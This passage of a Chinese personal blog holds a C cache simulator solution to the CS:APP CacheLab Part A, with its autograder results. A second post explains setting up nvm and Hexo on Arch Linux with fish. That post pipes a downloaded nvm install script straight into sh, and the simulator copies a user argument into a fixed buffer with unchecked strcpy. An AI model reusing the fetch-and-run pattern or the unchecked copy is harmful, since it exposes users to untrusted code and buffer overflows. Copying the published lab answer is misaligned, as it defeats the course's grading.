class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdint.h"</span></span></div><div class="line"></div><div class="line"><span class="comment">/* cache struct definition */</span></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CSim_Cache_Entry</span> &#123;</span></div><div class="line">    <span class="keyword">char</span> valid_bit;</div><div class="line">    <span class="keyword">uint64_t</span> tag_bit;</div><div class="line">&#125;CSim_Cache_Entry;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CSim_Cache_Set</span>&#123;</span></div><div class="line">    CSim_Cache_Entry * entries;</div><div class="line">&#125;CSim_Cache_Set;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CSim_Cache</span> &#123;</span></div><div class="line">    <span class="comment">/* basic arguments */</span></div><div class="line">    <span class="keyword">int</span> block_offset;</div><div class="line">    <span class="keyword">int</span> set_number;</div><div class="line">    <span class="keyword">int</span> line_number;</div><div class="line">    <span class="comment">/* masks and offsets */</span></div><div class="line">    <span class="keyword">int</span> tag_offset;</div><div class="line">    <span class="keyword">int</span> set_offset;</div><div class="line">    <span class="keyword">uint64_t</span> tag_mask;</div><div class="line">    <span class="keyword">uint64_t</span> set_mask;</div><div class="line">    <span class="comment">/* cache */</span></div><div class="line">    CSim_Cache_Set * sets;</div><div class="line">&#125;CSim_Cache;</div><div class="line"></div><div class="line"><span class="comment">/* simulation result definition */</span></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CSim_Cache_Result</span> &#123;</span></div><div class="line">    <span class="keyword">int</span> hit;</div><div class="line">    <span class="keyword">int</span> miss;</div><div class="line">    <span class="keyword">int</span> evict;</div><div class="line">&#125;CSim_Cache_Result;</div><div class="line"></div><div class="line"><span class="comment">/* operation type definition */</span></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> CSIM_OPERATION_TYPE &#123;</div><div class="line">    CSIM_OPERATION_TYPE_NONE,</div><div class="line">    CSIM_OPERATION_TYPE_MODIFY,</div><div class="line">    CSIM_OPERATION_TYPE_LOAD,</div><div class="line">    CSIM_OPERATION_TYPE_STORE,</div><div class="line">&#125;CSIM_OPERATION_TYPE;</div><div class="line"></div><div class="line"><span class="comment">/* operation result definition */</span></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> CSIM_OPERATION_RESULT &#123;</div><div class="line">    CSIM_OPERATION_RESULT_MISS,</div><div class="line">    CSIM_OPERATION_RESULT_HIT,</div><div class="line">    CSIM_OPERATION_RESULT_MISS_EVICTION,</div><div class="line">&#125;CSIM_OPERATION_RESULT;</div><div class="line"></div><div class="line"><span class="comment">/* error definition */</span></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> CSIM_ERROR &#123;</div><div class="line">    CSIM_OK = <span class="number">0</span>,</div><div class="line">    CSIM_ERROR_INVALID_OPTION,</div><div class="line">    CSIM_ERROR_MISSING_ARGUMENT,</div><div class="line">    CSIM_ERROR_FILE_CANNOT_OPEN,</div><div class="line">    CSIM_ERROR_OUT_OF_MEMORY,</div><div class="line">&#125;CSIM_ERROR;</div><div class="line"></div><div class="line"><span class="comment">/* macro definition for get a value given mask and offset */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> csim_get_value(number, mask, offset) (((number) &amp; (mask)) &gt;&gt; (offset))</span></div><div class="line"></div><div class="line"><span class="comment">/* function list */</span></div><div class="line"><span class="comment">/* message print functions */</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">csim_print_help_info</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">csim_error_missing_argument</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">csim_error_file_cannot_open</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">csim_error_out_of_memory</span><span class="params">()</span></span>;</div><div class="line"><span class="comment">/* cache structure related functions */</span></div><div class="line"><span class="function">CSim_Cache * <span class="title">csim_construct_cache</span><span class="params">(<span class="keyword">int</span> set_number, <span class="keyword">int</span> line_number, <span class="keyword">int</span> block_offset)</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">csim_deconstruct_cache</span><span class="params">(CSim_Cache ** pcache)</span></span>;</div><div class="line"><span class="comment">/* cache simulation function */</span></div><div class="line"><span class="function">CSim_Cache_Result <span class="title">csim_parse_trace_file</span><span class="params">(CSim_Cache * cache, FILE * file_pointer, <span class="keyword">char</span> verbose_flag)</span></span>;</div><div class="line"></div><div class="line"><span class="comment">/* global variable */</span></div><div class="line"><span class="keyword">char</span> * program_name = <span class="literal">NULL</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">csim_print_help_info</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Usage: ./csim [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Options:\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"  -h         Print this help message.\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"  -v         Optional verbose flag.\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"  -s &lt;num&gt;   Number of set index bits.\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"  -E &lt;num&gt;   Number of lines per set.\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"  -b &lt;num&gt;   Number of block offset bits.\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"  -t &lt;file&gt;  Trace file.\n\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Examples:\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"  linux&gt;  ./csim -s 4 -E 1 -b 4 -t traces/yi.trace\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"  linux&gt;  ./csim -v -s 8 -E 2 -b 4 -t traces/yi.trace\n"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">csim_error_missing_argument</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s: Missing required command line argument\n"</span>, program_name);</div><div class="line">    csim_print_help_info();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">csim_error_file_cannot_open</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s: No such file or directory\n"</span>, program_name);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">csim_error_out_of_memory</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s: Out of memory\n"</span>, program_name);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function">CSim_Cache * <span class="title">csim_construct_cache</span><span class="params">(<span class="keyword">int</span> set_number, <span class="keyword">int</span> line_number, <span class="keyword">int</span> block_offset)</span> </span>&#123;</div><div class="line">    <span class="comment">/* memory allocation */</span></div><div class="line">    CSim_Cache * cache = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CSim_Cache));</div><div class="line">    <span class="keyword">if</span> (cache == <span class="literal">NULL</span>) &#123;</div><div class="line">        csim_error_out_of_memory();</div><div class="line">        <span class="built_in">exit</span>(CSIM_ERROR_OUT_OF_MEMORY);</div><div class="line">    &#125;</div><div class="line">    <span class="comment">/* configure basic arguments */</span></div><div class="line">    cache-&gt;set_number = set_number;</div><div class="line">    cache-&gt;line_number = line_number;</div><div class="line">    cache-&gt;block_offset = block_offset;</div><div class="line">    <span class="comment">/* caculate masks and offsets */</span></div><div class="line">    cache-&gt;tag_mask = ((<span class="keyword">uint64_t</span>)<span class="number">0xFFFFFFFFFFFFFFFF</span>) &lt;&lt; (block_offset + set_number);</div><div class="line">    cache-&gt;tag_offset = block_offset + set_number;</div><div class="line">    cache-&gt;set_mask = ((((((<span class="keyword">uint64_t</span>)<span class="number">0xFFFFFFFFFFFFFFFF</span>) &lt;&lt; (<span class="number">64</span> - cache-&gt;tag_offset)) &gt;&gt; (<span class="number">64</span> - cache-&gt;tag_offset)) &gt;&gt; block_offset) &lt;&lt; block_offset);</div><div class="line">    cache-&gt;set_offset = block_offset;</div><div class="line">    <span class="comment">/* memory allocation for cache */</span></div><div class="line">    cache-&gt;sets = <span class="built_in">calloc</span>((<span class="number">1</span> &lt;&lt; set_number), <span class="keyword">sizeof</span>(CSim_Cache_Set));</div><div class="line">    <span class="keyword">if</span> (cache-&gt;sets == <span class="literal">NULL</span>) &#123;</div><div class="line">        csim_error_out_of_memory();</div><div class="line">        <span class="built_in">exit</span>(CSIM_ERROR_OUT_OF_MEMORY);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span> ; index &lt; (<span class="number">1</span> &lt;&lt; set_number) ; ++index) &#123;</div><div class="line">        (cache-&gt;sets)[index].entries = <span class="built_in">calloc</span>(line_number, <span class="keyword">sizeof</span>(CSim_Cache_Entry));</div><div class="line">        <span class="keyword">if</span> ((cache-&gt;sets)[index].entries == <span class="literal">NULL</span>) &#123;</div><div class="line">            csim_error_out_of_memory();</div><div class="line">            <span class="built_in">exit</span>(CSIM_ERROR_OUT_OF_MEMORY);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> cache;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">csim_deconstruct_cache</span><span class="params">(CSim_Cache ** pcache)</span> </span>&#123;</div><div class="line">    <span class="comment">/* release cache according to construct function */</span></div><div class="line">    CSim_Cache * temp = *pcache;</div><div class="line">    <span class="keyword">int</span> set_number = temp-&gt;set_number;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span> ; index &lt; set_number ; ++index) &#123;</div><div class="line">        <span class="built_in">free</span>((temp-&gt;sets)[index].entries);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">free</span>(temp-&gt;sets);</div><div class="line">    <span class="built_in">free</span>(temp);</div><div class="line">    *pcache = <span class="literal">NULL</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function">CSim_Cache_Result <span class="title">csim_parse_trace_file</span><span class="params">(CSim_Cache * cache, FILE * file_pointer, <span class="keyword">char</span> verbose_flag)</span> </span>&#123;</div><div class="line">    <span class="comment">/* file I/O related */</span></div><div class="line">    <span class="keyword">char</span> line[<span class="number">80</span>];</div><div class="line">    <span class="keyword">char</span> * line_pointer = <span class="literal">NULL</span>;</div><div class="line">    <span class="comment">/* cache type and cache result */</span></div><div class="line">    CSIM_OPERATION_TYPE type;</div><div class="line">    CSIM_OPERATION_RESULT result;</div><div class="line">    <span class="comment">/* address and set index &amp; tag bis from it */</span></div><div class="line">    <span class="keyword">int</span> address = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> <span class="built_in">set</span> = <span class="number">0</span>, tag = <span class="number">0</span>;</div><div class="line">    <span class="comment">/* line number */</span></div><div class="line">    <span class="keyword">int</span> line_number = cache-&gt;line_number;</div><div class="line">    <span class="comment">/* simulation result */</span></div><div class="line">    CSim_Cache_Result summary = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</div><div class="line">    <span class="comment">/* parsing process */</span></div><div class="line">    <span class="keyword">while</span> (fgets(line, <span class="number">80</span>, file_pointer), feof(file_pointer) == <span class="number">0</span>) &#123;</div><div class="line">        line_pointer = line;</div><div class="line">        type = CSIM_OPERATION_TYPE_NONE;</div><div class="line">        <span class="comment">/* exclude instrction load */</span></div><div class="line">        <span class="keyword">if</span> (*line_pointer++ == <span class="string">' '</span>) &#123;</div><div class="line">            <span class="keyword">switch</span>(*line_pointer++) &#123;</div><div class="line">                <span class="keyword">case</span> <span class="string">'L'</span>:</div><div class="line">                    type = CSIM_OPERATION_TYPE_LOAD;</div><div class="line">                    <span class="keyword">if</span> (verbose_flag) &#123;</div><div class="line">                        <span class="built_in">putchar</span>(<span class="string">'L'</span>);</div><div class="line">                    &#125;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> <span class="string">'S'</span>:</div><div class="line">                    type = CSIM_OPERATION_TYPE_STORE;</div><div class="line">                    <span class="keyword">if</span> (verbose_flag) &#123;</div><div class="line">                        <span class="built_in">putchar</span>(<span class="string">'S'</span>);</div><div class="line">                    &#125;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> <span class="string">'M'</span>:</div><div class="line">                    type = CSIM_OPERATION_TYPE_MODIFY;</div><div class="line">                    <span class="keyword">if</span> (verbose_flag) &#123;</div><div class="line">                        <span class="built_in">putchar</span>(<span class="string">'M'</span>);</div><div class="line">                    &#125;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">default</span>:</div><div class="line">                    type = CSIM_OPERATION_TYPE_NONE;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">            &#125;</div><div class="line">            result = CSIM_OPERATION_RESULT_MISS_EVICTION;</div><div class="line">            <span class="built_in">sscanf</span>(line_pointer, <span class="string">"%x"</span>, &amp;address);</div><div class="line">            <span class="keyword">if</span> (verbose_flag) &#123;</div><div class="line">                <span class="keyword">while</span> ((*line_pointer) != <span class="string">'\n'</span>) &#123;</div><div class="line">                    <span class="built_in">putchar</span>(*line_pointer++);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="comment">/* separate set and tag according to mask and offset */</span></div><div class="line">            <span class="built_in">set</span> = csim_get_value(address, cache-&gt;set_mask, cache-&gt;set_offset);</div><div class="line">            tag = csim_get_value(address, cache-&gt;tag_mask, cache-&gt;tag_offset);</div><div class="line">            <span class="comment">/* determine the cache result */</span></div><div class="line">            CSim_Cache_Entry * pentry = (cache-&gt;sets)[<span class="built_in">set</span>].entries;</div><div class="line">            <span class="keyword">int</span> index;</div><div class="line">            CSim_Cache_Entry temp;</div><div class="line">            <span class="keyword">for</span> (index = <span class="number">0</span>; index &lt; line_number ; ++index) &#123;</div><div class="line">                <span class="keyword">if</span> (!pentry[index].valid_bit) &#123;</div><div class="line">                    result = CSIM_OPERATION_RESULT_MISS;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">if</span> (pentry[index].tag_bit == tag) &#123;</div><div class="line">                    result = CSIM_OPERATION_RESULT_HIT;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="comment">/* simulate according to the result of cache behavior */</span></div><div class="line">            <span class="keyword">switch</span>(result) &#123;</div><div class="line">                <span class="keyword">case</span> CSIM_OPERATION_RESULT_MISS:</div><div class="line">                    <span class="keyword">if</span> (verbose_flag) &#123;</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">" miss"</span>);</div><div class="line">                    &#125;</div><div class="line">                    pentry[index].valid_bit = <span class="number">1</span>;</div><div class="line">                    pentry[index].tag_bit = tag;</div><div class="line">                    summary.miss++;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> CSIM_OPERATION_RESULT_MISS_EVICTION:</div><div class="line">                    <span class="keyword">if</span> (verbose_flag) &#123;</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">" miss eviction"</span>);</div><div class="line">                    &#125;</div><div class="line">                    pentry[<span class="number">0</span>].tag_bit = tag;</div><div class="line">                    temp = pentry[<span class="number">0</span>];</div><div class="line">                    <span class="keyword">for</span> (index = <span class="number">0</span> ; index &lt; line_number - <span class="number">1</span> ; ++index) &#123;</div><div class="line">                        pentry[index] = pentry[index + <span class="number">1</span>];</div><div class="line">                    &#125;</div><div class="line">                    pentry[index] = temp;</div><div class="line">                    summary.miss++;</div><div class="line">                    summary.evict++;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> CSIM_OPERATION_RESULT_HIT:</div><div class="line">                    <span class="keyword">if</span> (verbose_flag) &#123;</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">" hit"</span>);</div><div class="line">                    &#125;</div><div class="line">                    temp = pentry[index];</div><div class="line">                    <span class="keyword">for</span> ( ; (index &lt; line_number - <span class="number">1</span>) &amp;&amp; (pentry[index + <span class="number">1</span>].valid_bit) ; ++index) &#123;</div><div class="line">                        pentry[index] = pentry[index + <span class="number">1</span>];</div><div class="line">                    &#125;</div><div class="line">                    pentry[index] = temp;</div><div class="line">                    summary.hit++;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (type == CSIM_OPERATION_TYPE_MODIFY) &#123;</div><div class="line">                <span class="keyword">if</span> (verbose_flag) &#123;</div><div class="line">                    <span class="built_in">printf</span>(<span class="string">" hit"</span>);</div><div class="line">                &#125;</div><div class="line">                summary.hit++;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (verbose_flag) &#123;</div><div class="line">                <span class="built_in">putchar</span>(<span class="string">'\n'</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> summary;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</div><div class="line">    <span class="comment">/* variables for argument parsing */</span></div><div class="line">    <span class="keyword">char</span> h = <span class="number">0</span>, v = <span class="number">0</span>, s = <span class="number">0</span>, E = <span class="number">0</span>, b = <span class="number">0</span>, t = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> opt;</div><div class="line">    <span class="comment">/* cache arguments */</span></div><div class="line">    <span class="keyword">int</span> set_number = <span class="number">0</span>, line_number = <span class="number">0</span>, block_offset = <span class="number">0</span>;</div><div class="line">    <span class="comment">/* cache */</span></div><div class="line">    CSim_Cache * cache = <span class="literal">NULL</span>;</div><div class="line">    <span class="comment">/* file path */</span></div><div class="line">    <span class="keyword">char</span> file_path[<span class="number">80</span>];</div><div class="line">    <span class="comment">/* verbose flag */</span></div><div class="line">    <span class="keyword">char</span> verbose_flag = <span class="number">0</span>;</div><div class="line">    <span class="comment">/* summary */</span></div><div class="line">    CSim_Cache_Result summary = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</div><div class="line">    <span class="comment">/* pre-operation */</span></div><div class="line">    program_name = argv[<span class="number">0</span>];</div><div class="line">    <span class="comment">/* argument parsing */</span></div><div class="line">    <span class="keyword">while</span> ((opt = getopt(argc, argv, <span class="string">"hvs:E:b:t:"</span>)) != <span class="number">-1</span>) &#123;</div><div class="line">        <span class="keyword">switch</span>(opt) &#123;</div><div class="line">            <span class="keyword">case</span> <span class="string">'h'</span>:</div><div class="line">                h = <span class="number">1</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="string">'v'</span>:</div><div class="line">                v = <span class="number">1</span>;</div><div class="line">                verbose_flag = <span class="number">1</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="string">'s'</span>:</div><div class="line">                set_number = atoi(optarg);</div><div class="line">                <span class="keyword">if</span> (set_number == <span class="number">0</span>) &#123;</div><div class="line">                    csim_error_missing_argument();</div><div class="line">                    <span class="keyword">return</span> CSIM_ERROR_MISSING_ARGUMENT;</div><div class="line">                &#125;</div><div class="line">                s = <span class="number">1</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="string">'E'</span>:</div><div class="line">                line_number = atoi(optarg);</div><div class="line">                <span class="keyword">if</span> (line_number == <span class="number">0</span>) &#123;</div><div class="line">                    csim_error_missing_argument();</div><div class="line">                    <span class="keyword">return</span> CSIM_ERROR_MISSING_ARGUMENT;</div><div class="line">                &#125;</div><div class="line">                E = <span class="number">1</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="string">'b'</span>:</div><div class="line">                block_offset = atoi(optarg);</div><div class="line">                <span class="keyword">if</span> (block_offset == <span class="number">0</span>) &#123;</div><div class="line">                    csim_error_missing_argument();</div><div class="line">                    <span class="keyword">return</span> CSIM_ERROR_MISSING_ARGUMENT;</div><div class="line">                &#125;</div><div class="line">                b = <span class="number">1</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="string">'t'</span>:</div><div class="line">                t = <span class="number">1</span>;</div><div class="line">                <span class="built_in">strcpy</span>(file_path, optarg);</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">default</span>:</div><div class="line">                csim_print_help_info();</div><div class="line">                <span class="keyword">return</span> CSIM_ERROR_INVALID_OPTION;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (h == <span class="number">1</span>) &#123;</div><div class="line">        csim_print_help_info();</div><div class="line">        <span class="keyword">return</span> CSIM_OK;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (v == <span class="number">1</span>) &#123;</div><div class="line">        verbose_flag = <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (!(s == <span class="number">1</span> &amp;&amp; E == <span class="number">1</span> &amp;&amp; b == <span class="number">1</span> &amp;&amp; t == <span class="number">1</span>)) &#123;</div><div class="line">        csim_error_missing_argument();</div><div class="line">        <span class="keyword">return</span> CSIM_ERROR_MISSING_ARGUMENT;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">/* file processing */</span></div><div class="line">    FILE * file_pointer = fopen(file_path, <span class="string">"r"</span>);</div><div class="line">    <span class="keyword">if</span> (file_pointer == <span class="literal">NULL</span>) &#123;</div><div class="line">        csim_error_file_cannot_open(file_path);</div><div class="line">        <span class="keyword">return</span> CSIM_ERROR_FILE_CANNOT_OPEN;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">/* cache construction */</span></div><div class="line">    cache = csim_construct_cache(set_number, line_number, block_offset);</div><div class="line">    <span class="comment">/* trace file parsing */</span></div><div class="line">    summary = csim_parse_trace_file(cache, file_pointer, verbose_flag);</div><div class="line">    <span class="comment">/* summary */</span></div><div class="line">    printSummary(summary.hit, summary.miss, summary.evict);</div><div class="line">    <span class="comment">/* post operations */</span></div><div class="line">    csim_deconstruct_cache(&amp;cache);</div><div class="line">    fclose(file_pointer);</div><div class="line">    <span class="keyword">return</span> CSIM_OK;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><p>自动评分脚本给出的输出如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">user@blackdragon ~/C/C/cachelab-handout&gt; ./<span class="built_in">test</span>-csim</div><div class="line">                        Your simulator     Reference simulator</div><div class="line">Points (s,E,b)    Hits  Misses  Evicts    Hits  Misses  Evicts</div><div class="line">     3 (1,1,1)       9       8       6       9       8       6  traces/yi2.trace</div><div class="line">     3 (4,2,4)       4       5       2       4       5       2  traces/yi.trace</div><div class="line">     3 (2,1,4)       2       3       1       2       3       1  traces/dave.trace</div><div class="line">     3 (2,1,3)     167      71      67     167      71      67  traces/trans.trace</div><div class="line">     3 (2,2,3)     201      37      29     201      37      29  traces/trans.trace</div><div class="line">     3 (2,4,3)     212      26      10     212      26      10  traces/trans.trace</div><div class="line">     3 (5,1,5)     231       7       0     231       7       0  traces/trans.trace</div><div class="line">     6 (5,1,5)  265189   21775   21743  265189   21775   21743  traces/long.trace</div><div class="line">    27</div><div class="line"></div><div class="line">TEST_CSIM_RESULTS=27</div></pre></td></tr></table></figure></p>
<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>由于在寒假的课程设计中已经使用过了命令行参数解析以及复杂的数据结构设计与实验，Part A总体上来说不是很难，我主要的精力花费在代码风格上，希望代码能尽量具有良好的架构以及可读性。</p>
<p>本部分中犯的错误有，直接根据s设置缓存的组数，而实际上的组数是2^s个。循环中由于手误导致出现死循环。没有搞清楚inline static关键字而导致的编译错误等等。存在知识的盲区也存在着粗心导致的错误，以后还需要更加注意。</p>

                    
                        

                    
                    
                        <p>
                            <a href="/2017/07/08/深入理解计算机系统CacheLab-PartA实验报告/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title" itemprop="headline">
                    
                        <a class="link-unstyled" href="/2017/07/06/Arch下Hexo配置的问题总结/">
                            Arch下Hexo配置的问题总结
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time itemprop="datePublished" datetime="2017-07-06T20:29:45+08:00">
	
		    7月 06, 2017
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/杂谈/">杂谈</a>


    
</div>

            </div>
            
                <div class="postShorten-content" itemprop="articleBody">
                    <blockquote>
<p>近期将主力环境从macOS切换至Arch Linux，然后将博客从原环境迁移至现环境，本来以为过程会比较简单，结果却还是踩了几个坑，现在将配置过程中遇到的问题记录并且总结如下。</p>
</blockquote>
<h2 id="在Arch-Linux中安装Git和Node-js"><a href="#在Arch-Linux中安装Git和Node-js" class="headerlink" title="在Arch Linux中安装Git和Node.js"></a>在Arch Linux中安装Git和Node.js</h2><p>根据<a href="https://hexo.io/zh-cn/docs/index.html" target="_blank" rel="external">Hexo官方文档</a>的说明，安装Hexo需要的依赖为Git和Node.js。<br>Git的安装比较简单，使用Arch Linux的默认包管理器pacman即可安装：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ pacman -S git</div></pre></td></tr></table></figure><br>Node.js官方文档推荐使用nvm安装，并且官方文档给出了安装脚本。<br>但是我的电脑使用的是伪fish——参考<a href="https://wiki.archlinux.org/index.php/Fish" target="_blank" rel="external">Arch Wiki</a>，我通过的是通过给terminal emulator添加参数的方式进入fish的。<br>因此，我的默认shell仍然是bash。而该安装脚本在检测到我的默认shell之后直接将相关的导出环境变量的命令添加至了.bashrc，导致了进入fish之后由于相关的环境变量丢失无法找到nvm命令的问题。</p>
<ol>
<li>第一种解决方法是采用Node.js的fish版安装脚本，该脚本托管在<a href="https://github.com/Alex7Kom/nvm-fish" target="_blank" rel="external">Github</a>上，但是该脚本目前已不再被MAINTAINED，需要自行承担风险。</li>
<li>第二种解决方法是采用<a href="https://github.com/edc/bass" target="_blank" rel="external">bass</a>包装原始的nvm。</li>
</ol>
<p>对于第二种解决方法，我们首先使用官方文档的安装脚本安装nvm：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ wget -qO- https://raw.github.com/creationix/nvm/master/install.sh | sh</div></pre></td></tr></table></figure><br>然后我们按照Github上的教程手动安装bass：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ git clone https://github.com/edc/bass.git</div><div class="line">$ cd bass</div><div class="line">$ make install</div></pre></td></tr></table></figure><br>最后我们建立如下的文件并重启终端，即可正常地在fish中使用nvm：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ cat ~/.config/fish/functions/nvm.fish</div><div class="line">function nvm</div><div class="line">    bass source ~/.nvm/nvm.sh --no-use &apos;;&apos; nvm $argv</div><div class="line">end</div></pre></td></tr></table></figure><br>使用nvm安装Node.js最新版本的命令如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ nvm install v8.1.3</div></pre></td></tr></table></figure><br>最后我们安装hexo：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install -g hexo-cli</div></pre></td></tr></table></figure></p>
